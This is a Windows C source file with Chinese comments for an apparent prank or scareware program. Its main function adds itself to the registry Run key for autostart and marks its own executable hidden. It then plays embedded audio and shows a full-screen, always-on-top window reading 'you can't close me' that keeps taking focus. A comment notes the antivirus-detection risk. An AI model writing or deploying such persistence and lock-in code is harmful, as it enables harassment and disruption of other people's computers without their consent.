// #include <stdio.h>
// #include <stdlib.h>
// #include <windows.h>

#include "test_1.c"

/*
gcc 编译命令
gcc -o .\test.exe .\test.c -mwindows -user32
*/

// WindowProc 是一个回调函数，用于处理窗口消息的函数。
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    // 用于存储自定义字体
    HFONT g_hFont = CreateFont(
        34,                     // 字体高度
        0,                      // 字体宽度
        0,                      // 字体倾斜度
        0,                      // 字体倾斜度
        FW_BOLD,                // 字体粗细，使用 FW_BOLD 表示加粗字体
        FALSE,                  // 是否斜体
        FALSE,                  // 是否下划线
        FALSE,                  // 是否删除线
        DEFAULT_CHARSET,        // 字符集
        OUT_DEFAULT_PRECIS,     // 输出精度
        CLIP_DEFAULT_PRECIS,    // 剪辑精度
        1,        // 字体质量
        DEFAULT_PITCH | FF_SWISS,   // 字体间距和字体系列
        "Arial"                 // 字体名称
    ); 
    HFONT g_hFont1 = CreateFont(
        20,0,0,0,FW_BOLD,FALSE,FALSE,FALSE,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,1,
        DEFAULT_PITCH | FF_SWISS,"Arial"); 
        
    // 自定义文本颜色，这里设置为红色
    COLORREF g_textColor = RGB(255, 0, 0);  
    // 获取窗口客户区的大小
    RECT clientRect;
    GetClientRect(hwnd, &clientRect);
    HWND hEdit=NULL;

    switch (uMsg) {
        case WM_CREATE:
        {
            // 使用 SetWindowPos 函数将窗口置前
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
                        
            return 0;
        }
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            // 设置字体和文本颜色
            HFONT hOldFont = (HFONT)SelectObject(hdc, g_hFont);
            SetTextColor(hdc, g_textColor);

            // 计算文本的矩形区域
            RECT textRect;
            textRect.left = clientRect.left + 50;    // 设置文本的左边界
            textRect.top = clientRect.top + 300;      // 设置文本的上边界
            textRect.right = clientRect.right - 50;  // 设置文本的右边界
            textRect.bottom = clientRect.top + 350;// 设置文本的下边界

            // 绘制文本
            SetBkMode(hdc, TRANSPARENT);  // 设置背景模式为透明，确保文本背景不会被绘制
            // 系统会乱码
            // DrawText(hdc, "你关不了我,(¬◡¬)✧(¬◡¬ )✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            DrawTextW(hdc, L"你关不了我 (¬◡¬)✧ (¬◡¬)✧", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            // 恢复原有的字体
            SelectObject(hdc, hOldFont);

            HFONT hOldFont1 = (HFONT)SelectObject(hdc, g_hFont1);
            SetTextColor(hdc, RGB(50,0,0));
            textRect.left=clientRect.right-400;
            textRect.right=clientRect.right;
            textRect.top=clientRect.bottom-100;
            textRect.bottom=clientRect.bottom;
            DrawTextW(hdc, L"Contact 2953815063@qq.com for the problems", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            SelectObject(hdc, hOldFont1);

            EndPaint(hwnd, &ps);
            break;
        }

        // 关闭窗口(状态栏叉掉)
        case WM_CLOSE:
            // 删掉temp.mp3
            // remove("temp.mp3");

            // 释放字体资源
            if (g_hFont != NULL)
            {
                DeleteObject(g_hFont);
                g_hFont = NULL;
            }

            hwnd = NULL; // 将 hwnd 设置为 NULL
            DestroyWindow(hwnd);
            return 0;

        case WM_DESTROY:
            // 释放字体资源
            if (g_hFont != NULL)
            {
                DeleteObject(g_hFont);
                g_hFont = NULL;
            }

            hwnd = NULL;  // 将 hwnd 设置为 NULL
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


int main() {
    // 开机自启动
    // 获取当前可执行文件路径
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // 打开注册表项
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    // 设置注册表项的值
    RegSetValueEx(hKey, "MyApp", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));

    // 关闭注册表项
    RegCloseKey(hKey);
    // 将文件属性设置为隐藏
    SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);


    // 注册窗口类
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;    // WindowProc 是一个回调函数，用于处理窗口消息的函数。
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "MyWindowClass";
    RegisterClass(&wc);

    // 获取屏幕尺寸
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);

    // 播放音频文件
    playEmbeddedAudio();
    
    HWND hwnd=NULL;
    while(hwnd==NULL){
        // 创建窗口
        hwnd = CreateWindow(
            "MyWindowClass",       // 窗口类型
            "HowAreYou",          // 窗口名字
            WS_POPUP | WS_VISIBLE | WS_BORDER,
            0,0, screen_width,screen_height,
            NULL,
            NULL,
            NULL,
            NULL
        );

        // 设置窗口样式
        SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED | WS_EX_TRANSPARENT);
        SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

        // 显示弹窗
        ShowWindow(hwnd, SW_SHOW);

        // 获取鼠标焦点
        SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) & ~WS_EX_TRANSPARENT);

        // 消息循环
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            // 设置窗口位置
            // SetWindowPos(hwnd, NULL, rand()%(screen_width-200), rand()%(screen_height-100), 200, 100, SWP_NOZORDER | SWP_NOSIZE);
            
            // 容易被查杀
            SetForegroundWindow(hwnd);
            // SetFocus(hwnd);
        }
    }
    return 0;
}